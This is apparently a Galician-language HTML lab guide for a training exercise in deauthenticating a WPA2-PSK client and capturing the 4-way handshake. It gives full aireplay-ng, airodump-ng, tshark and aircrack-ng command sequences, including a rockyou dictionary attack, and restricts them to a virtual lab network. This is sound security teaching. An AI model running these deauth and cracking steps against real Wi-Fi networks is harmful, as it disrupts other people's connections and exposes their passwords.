@@ -1,0 +1,154 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica 1.2 — Desautenticación dun cliente WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica 1.2 — Desautenticación dun cliente WPA2-PSK</h1>
+<div class="notice important"><strong>Práctica docente de referencia</strong>
+<p>Esta guía desenvolve o procedemento do <strong><a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-2.pdf">PDF «1-Taller-HE-Practica-WiFi-2.pdf»</a>{:target=&quot;_blank&quot;}</strong>, centrado na desautenticación dun cliente e na captura do <em>4-way handshake</em>. É continuación da <a href="1.1-ATAQUE_WPA2_PSK.html">práctica 1.1 — Auditoría WPA2-PSK</a>.</p>
+</div>
+<div class="notice warning"><strong>Uso autorizado</strong>
+<p>Todos os comandos de inxección de tramas desta práctica deben executarse <strong>exclusivamente no escenario virtual <code>psk</code></strong>, coa rede docente <code>EMPRESA-XYZ</code> e as direccións MAC obtidas nesta execución. Non realices estas probas contra redes Wi-Fi alleas.</p>
+</div>
+<h2>1. Obxectivos e fundamentos</h2>
+<p>Nesta práctica comprobaremos como unha <strong>trama de desautenticación 802.11 non protexida</strong> pode provocar a desconexión dun cliente asociado a un punto de acceso WPA2-PSK sen PMF requirido. Analizaremos o que sucede durante a reconexión e comprobaremos se é posible rexistrar un novo intercambio EAPOL-Key.</p>
+<p>A desautenticación <strong>non descobre directamente a clave Wi-Fi</strong>. Pode provocar unha nova autenticación que facilite a captura dun <em>handshake</em>, sobre o que posteriormente se podería realizar unha proba <strong>offline</strong> coa ferramenta <code>aircrack-ng</code> e un dicionario. A eficacia desa análise depende da calidade da captura e da fortaleza do contrasinal.</p>
+<h3>Que é <code>aireplay-ng</code>?</h3>
+<p><code>aireplay-ng</code> é unha ferramenta da suite <strong>Aircrack-ng</strong> que permite inxectar tramas 802.11 mediante unha interface Wi-Fi en modo monitor. Un dos seus usos en auditorías autorizadas é a emisión de tramas de desautenticación para observar a reacción dun cliente.</p>
+<p>O PDF de referencia explica a seguinte sintaxe:</p>
+<pre><code class="language-text">sudo aireplay-ng --deauth 10 -a BSSID_AP -c MAC_CLIENTE INTERFACE_MONITOR
+</code></pre>
+<ul>
+<li><strong><code>--deauth 10</code></strong>, equivalente a <strong><code>-0 10</code></strong>: solicita dez ráfagas de desautenticación; non significa necesariamente dez tramas exactas.</li>
+<li><strong><code>-a</code></strong>: dirección MAC (BSSID) do punto de acceso.</li>
+<li><strong><code>-c</code></strong>: dirección MAC do cliente asociado.</li>
+<li><strong><code>INTERFACE_MONITOR</code></strong>: interface desde a que se emiten as tramas.</li>
+</ul>
+<p>O programa pode mostrar contadores <strong>ACK</strong> (confirmacións de recepción a nivel 802.11). <strong>Non confundas ACK coa desconexión efectiva</strong>: cómpre comprobar tamén o estado do cliente e as tramas capturadas. Un resultado con <code>0 ACKs</code> tampouco permite, por si só, concluír que a inxección non se transmitiu.</p>
+<h3>Material necesario</h3>
+<ul>
+<li>Máquina virtual <code>vuln-wifi.lab</code> iniciada, coa sesión gráfica de <strong><code>kali</code></strong>.</li>
+<li>Escenario <code>psk</code> do laboratorio.</li>
+<li>Ferramentas <code>iw</code>, <code>airodump-ng</code>, <code>aireplay-ng</code>, <code>tshark</code> e, para a comprobación opcional do contrasinal, <code>aircrack-ng</code>.</li>
+<li>Dicionario Rockyou, unicamente para a análise offline opcional.</li>
+</ul>
+<h2>2. Organización das consolas e interfaces</h2>
+<p>O PDF monta manualmente o punto de acceso e o cliente e emprega <strong>catro consolas</strong>. Neste laboratorio esas tarefas de preparación xa as realiza <code>wifilabctl</code>; por iso utilizaremos tres terminais abertas no escritorio de Kali, cunha cuarta opcional para observar eventos en tempo real.</p>
+<p>| Terminal | Función | Interface empregada |
+|---|---|---|
+| <strong>Terminal 1 — Preparación e captura</strong> | Iniciar o escenario, identificar a rede e capturar paquetes | <code>wlan3</code> en modo monitor |
+| <strong>Terminal 2 — Desautenticación</strong> | Emitir unha proba dirixida ao cliente do laboratorio | <code>wlan2</code> en modo monitor |
+| <strong>Terminal 3 — Verificación</strong> | Consultar a asociación do cliente, os rexistros e analizar a captura | <code>wlan1</code> no <em>namespace</em> <code>wifi_cliente_wlan1</code> |
+| <strong>Terminal 4 — Eventos (opcional)</strong> | Observar eventos de conexión/desconexión mentres se fai a proba | <code>wlan1</code> no <em>namespace</em> do cliente |</p>
+<div class="notice note"><strong>Interfaces virtuais e namespaces</strong>
+<p><code>wlan0</code> pertence ao AP no <em>namespace</em> <code>wifi_ap_wlan0</code> e <code>wlan1</code> ao cliente no <em>namespace</em> <code>wifi_cliente_wlan1</code>. As interfaces globais <code>wlan2</code> e <code>wlan3</code> permiten respectivamente a inxección e a captura nesta práctica. <strong>Non copies BSSID nin MAC de exemplos anteriores</strong>, pois poden cambiar ao reiniciar o escenario.</p>
+</div>
+<h2>3. Preparar o escenario (Terminal 1)</h2>
+<p>Inicia o punto de acceso WPA2-PSK e o cliente:</p>
+<pre><code class="language-bash">sudo wifilabctl up psk
+sudo wifilabctl status
+</code></pre>
+<p>Identifica a interface do AP, a do cliente e o estado da asociación:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_ap_wlan0 iw dev wlan0 info
+sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 info
+sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Anota nun caderno de prácticas:</p>
+<ul>
+<li><strong>ESSID</strong> esperado: <code>EMPRESA-XYZ</code>.</li>
+<li><strong>BSSID_AP</strong>: dirección MAC do AP que figura na información de conexión do cliente e/ou na observación de rede.</li>
+<li><strong>MAC_CLIENTE</strong>: dirección <code>addr</code> da interface <code>wlan1</code> indicada por <code>iw dev wlan1 info</code>.</li>
+<li><strong>Canle</strong> esperada: <code>6</code>.</li>
+</ul>
+<p>Se o cliente aparece como <code>Not connected</code>, espera uns segundos e repite a última comprobación. Antes de continuar, confirma a asociación.</p>
+<h2>4. Recoñecer a rede e iniciar a captura (Terminal 1)</h2>
+<p>Configura a radio de observación en modo monitor, na canle 6:</p>
+<pre><code class="language-bash">sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+sudo iw dev wlan3 set channel 6
+sudo iw dev wlan3 info
+</code></pre>
+<p>Identifica a rede coa ferramenta empregada no PDF:</p>
+<pre><code class="language-bash">sudo airodump-ng --channel 6 wlan3
+</code></pre>
+<p>Localiza <code>EMPRESA-XYZ</code>, comproba o seu BSSID e sae premendo <strong>Ctrl+C</strong>. A continuación inicia a captura específica. Substitúe <strong><code>BSSID_AP</code></strong> polo valor que acabas de comprobar (sen incluír os símbolos <code>&lt;</code> e <code>&gt;</code>):</p>
+<pre><code class="language-bash">sudo airodump-ng -c 6 --bssid BSSID_AP -w captura_deauth wlan3
+</code></pre>
+<p><strong>Mantén a Terminal 1 aberta e capturando.</strong> O programa creará ficheiros como <code>captura_deauth-01.cap</code> no directorio actual.</p>
+<h2>5. Observar o cliente antes da proba (Terminal 3)</h2>
+<p>Abre outra terminal e comproba que segue conectado:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Opcionalmente, se queres observar os eventos de conexión en tempo real, abre a <strong>Terminal 4</strong> e deixa executándose:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw event -t
+</code></pre>
+<p>Se o evento transitorio non chega a aparecer na terminal, empregaremos igualmente o estado de conexión, os rexistros e a captura para valorar o resultado.</p>
+<h2>6. Executar unha desautenticación controlada (Terminal 2)</h2>
+<p>Abre a <strong>Terminal 2</strong>, mantendo a captura anterior en execución. Configura <code>wlan2</code> para a inxección:</p>
+<pre><code class="language-bash">sudo ip link set wlan2 down
+sudo iw dev wlan2 set type monitor
+sudo ip link set wlan2 up
+sudo iw dev wlan2 set channel 6
+sudo iw dev wlan2 info
+</code></pre>
+<p>Emprega <strong>só as dúas direccións MAC reais</strong> do escenario desta execución:</p>
+<pre><code class="language-bash">sudo aireplay-ng --deauth 1 -a BSSID_AP -c MAC_CLIENTE wlan2
+</code></pre>
+<p>Nesta primeira proba enviamos unha única ráfaga para minimizar a interferencia e facilitar a análise. O PDF tamén explica o exemplo <code>--deauth 10</code>; aquí comezamos con <code>1</code> e só repetiremos a proba se a evidencia non é suficiente.</p>
+<h3>Que debemos observar?</h3>
+<ol>
+<li><strong>Terminal 2:</strong> saída de <code>aireplay-ng</code>, incluíndo os ACK comunicados, se os hai.</li>
+<li><strong>Terminal 1:</strong> novas tramas na captura; se se reproduce a autenticación, <code>airodump-ng</code> pode indicar <code>WPA handshake</code>.</li>
+<li><strong>Terminal 3:</strong> estado do cliente antes e despois da proba.</li>
+<li><strong>Terminal 4 (opcional):</strong> eventos relacionados coa desconexión ou reconexión.</li>
+</ol>
+<p>Volvemos á <strong>Terminal 1</strong> e detemos a captura con <strong>Ctrl+C</strong> cando xa dispoñamos das evidencias. <strong>Non debemos dar por exitoso o ataque unicamente porque <code>aireplay-ng</code> se executase sen erros.</strong></p>
+<h2>7. Comprobar o resultado (Terminal 3)</h2>
+<h3>7.1. Estado do cliente</h3>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Se a asociación se restablece rapidamente, o cliente pode aparecer xa conectado cando consultemos o estado. Por iso é importante revisar tamén os eventos e a captura.</p>
+<h3>7.2. Tramas de desautenticación na captura</h3>
+<pre><code class="language-bash">sudo tshark -r captura_deauth-01.cap \
+  -Y 'wlan.fc.type_subtype == 0x0c' \
+  -T fields -e frame.number -e wlan.sa -e wlan.da \
+  -e wlan.fc.protected -e wlan.fixed.reason_code
+</code></pre>
+<p>A presenza de tramas <strong>DeAuth</strong> con bit <code>protected</code> desactivado documenta a emisión de tramas de xestión non protexidas. Hai que correlacionalas co BSSID e MAC do laboratorio e coa reacción do cliente.</p>
+<h3>7.3. Mensaxes do <em>4-way handshake</em></h3>
+<pre><code class="language-bash">sudo tshark -r captura_deauth-01.cap -Y eapol \
+  -T fields -e frame.number -e wlan.sa -e wlan.da \
+  -e wlan_rsna_eapol.keydes.msgnr
+</code></pre>
+<p>Busca as mensaxes <strong>M1, M2, M3 e M4</strong>; poden aparecer retransmisións ou un intercambio parcial. Se non aparecen, iso non demostra por si mesmo que non houbese desconexión: pode depender do momento da captura e da reconexión.</p>
+<h3>7.4. Rexistros do cliente (se están dispoñibles)</h3>
+<pre><code class="language-bash">sudo ls -l /home/kali/wifiLab/run/psk/
+sudo grep -Ei 'DISCONNECTED|CONNECTED|EAPOL|4-Way' \
+  /home/kali/wifiLab/run/psk/wpa_supplicant.log
+</code></pre>
+<div class="notice note"><strong>Interpretación dos rexistros</strong>
+<p>Dependendo de como se execute <code>wpa_supplicant</code>, ese ficheiro pode conter pouca información ou só a orde de inicio. <strong>A ausencia de eventos nel non invalida automaticamente a proba</strong>: contrasta os datos co PCAP e co estado real da interface.</p>
+</div>
+<h2>8. Análise offline opcional con Rockyou</h2>
+<p>O PDF de referencia remata cunha proba de dicionario sobre o <em>handshake</em> capturado. Esta fase <strong>non é imprescindible para demostrar a desautenticación</strong>; permite estudar a relación entre reconexión, captura EAPOL e robustez do contrasinal WPA2-PSK.</p>
+<p>Se existe o dicionario comprimido e aínda non está descomprimido:</p>
+<pre><code class="language-bash">sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<p>Se <code>rockyou.txt</code> xa existe, omite o paso anterior. Analiza exclusivamente a captura do escenario:</p>
+<pre><code class="language-bash">sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura_deauth-01.cap
+</code></pre>
+<p>No PDF amósase o resultado de exemplo <code>KEY FOUND! [ spongebob19 ]</code>. <strong>Non é unha saída garantida</strong>: require unha captura adecuada e que a frase de paso figure no dicionario. Esta análise non transmite novos paquetes contra o AP.</p>
+<h2>9. Evidencias que debe recoller o alumnado</h2>
+<ol>
+<li>Captura ou anotación do ESSID, BSSID do AP, MAC do cliente e canle.</li>
+<li>Estado da asociación antes e despois da desautenticación.</li>
+<li>Orde <code>aireplay-ng</code> empregada e saída real, sen interpretar os ACK como proba definitiva.</li>
+<li>Tramas DeAuth identificadas en <code>captura_deauth-01.cap</code>, indicando se estaban protexidas.</li>
+<li>Mensaxes EAPOL observadas, se houbo unha nova autenticación.</li>
+<li>Resultado da análise offline, <strong>só se se realizou</strong>.</li>
+</ol>
+<p><strong>Criterio de validación:</strong> considérase demostrada a desautenticación cando a evidencia permite relacionar a inxección dunha trama DeAuth non protexida cunha desconexión ou reasociación real do cliente. Un handshake novo constitúe unha evidencia adicional, non un requisito para concluír que existiu a desconexión.</p>
+<p>Se só observamos a emisión de tramas sen ningún cambio demostrable na asociación, o resultado debe rexistrarse como <strong>non concluínte</strong>, non como ataque exitoso.</p>
+<h2>10. Limpeza e seguinte práctica</h2>
+<p>Cando termines, detén as ferramentas de captura e observación abertas e restaura o laboratorio:</p>
+<pre><code class="language-bash">sudo wifilabctl reset
+</code></pre>
+<p>Na <strong><a href="1.3-ATAQUE_WPA2_PSK_PMF.html">práctica 1.3 — Protección das tramas de xestión (PMF)</a></strong> compararemos esta situación cun cliente que negocia PMF requirido. As tramas de desautenticación falsificadas e non protexidas deberían ser rexeitadas tras establecerse esa protección.</p>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
